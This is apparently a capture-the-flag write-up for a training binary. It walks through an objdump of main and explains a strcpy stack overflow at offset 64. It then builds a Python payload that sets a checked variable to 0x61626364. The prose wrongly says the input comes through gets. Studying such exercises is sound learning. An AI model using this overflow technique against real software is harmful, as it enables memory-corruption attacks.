@@ -1,0 +1,57 @@
+First we make the binary executable by command
+$ chmod +x pwn2-stackoverwritereturns
+
+Now we will take a look at assembler dump of binary
+$ objdump -d pwn2-stackoverwritereturns
+
+08048464 <main>:
+ 8048464:	55                   	push   %ebp
+ 8048465:	89 e5                	mov    %esp,%ebp
+ 8048467:	83 e4 f0             	and    $0xfffffff0,%esp
+ 804846a:	83 ec 60             	sub    $0x60,%esp
+ 804846d:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
+ 8048471:	75 14                	jne    8048487 <main+0x23>
+ 8048473:	c7 44 24 04 a0 85 04 	movl   $0x80485a0,0x4(%esp)
+ 804847a:	08 
+ 804847b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 8048482:	e8 01 ff ff ff       	call   8048388 <errx@plt>
+ 8048487:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%esp)
+ 804848e:	00 
+ 804848f:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048492:	83 c0 04             	add    $0x4,%eax
+ 8048495:	8b 00                	mov    (%eax),%eax
+ 8048497:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 804849b:	8d 44 24 1c          	lea    0x1c(%esp),%eax
+ 804849f:	89 04 24             	mov    %eax,(%esp)
+ 80484a2:	e8 c1 fe ff ff       	call   8048368 <strcpy@plt>
+ 80484a7:	8b 44 24 5c          	mov    0x5c(%esp),%eax
+ 80484ab:	3d 64 63 62 61       	cmp    $0x61626364,%eax
+ 80484b0:	75 0e                	jne    80484c0 <main+0x5c>
+ 80484b2:	c7 04 24 bc 85 04 08 	movl   $0x80485bc,(%esp)
+ 80484b9:	e8 da fe ff ff       	call   8048398 <puts@plt>
+ 80484be:	eb 15                	jmp    80484d5 <main+0x71>
+ 80484c0:	8b 54 24 5c          	mov    0x5c(%esp),%edx
+ 80484c4:	b8 f3 85 04 08       	mov    $0x80485f3,%eax
+ 80484c9:	89 54 24 04          	mov    %edx,0x4(%esp)
+ 80484cd:	89 04 24             	mov    %eax,(%esp)
+ 80484d0:	e8 a3 fe ff ff       	call   8048378 <printf@plt>
+ 80484d5:	c9                   	leave  
+ 80484d6:	c3                   	ret    
+ 80484d7:	90                   	nop
+ 80484d8:	90                   	nop
+ 80484d9:	90                   	nop
+ 80484da:	90                   	nop
+ 80484db:	90                   	nop
+ 80484dc:	90                   	nop
+ 80484dd:	90                   	nop
+ 80484de:	90                   	nop
+
+Upto line 27 we have same code as previous binary so our input through gets is going at 0x1c($esp) and we have to overflow to 
+0x5c($esp) so offset is 64 and this time we have to set specific value to 0x5c($esp) because at line 28 we see a comparison between 
+0x5c($esp) and 0x61626364 but the binary is liitle endian so it will store it backwards in 0x5c($esp) so we have to overflow to 
+0x5c($esp) and set it to given specified value so we use python and create our payload which we will give to binary as it's argument
+$ python -c 'print("a"*64+"dcba") '
+we get output "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba"
+now we give this as argument to this binary and we get
+output "you have correctly got the variable to the right value."
+
